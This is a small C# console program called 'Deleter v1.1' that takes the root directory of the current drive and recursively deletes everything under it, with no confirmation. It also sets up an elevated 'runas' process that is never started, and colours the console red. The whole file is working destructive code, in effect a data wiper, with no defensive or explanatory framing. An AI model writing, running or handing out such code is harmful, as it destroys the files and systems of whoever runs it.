using System;
using System.IO;
    class Deleter {
    public static string dir = Directory.GetDirectoryRoot(Directory.GetCurrentDirectory()); 
    public static bool DirExists = Directory.Exists(dir);
        public const string Ver = "1.1";
        public const string Title = "Deleter v" + Ver;
      public static void DeleteDir() {
          try { 
          Console.WriteLine("Deleting " + dir);
          Directory.Delete(dir, true);
            }
          catch (Exception ex) {
            Console.WriteLine("Error deleting " + dir);
            Console.WriteLine(ex);  
          }
          }
        static void Main(string[] args) {
        Console.Title = Title;
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.UseShellExecute = true;
        p.StartInfo.Verb = "runas";
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.BackgroundColor = ConsoleColor.DarkRed;
        DeleteDir();
          }
    }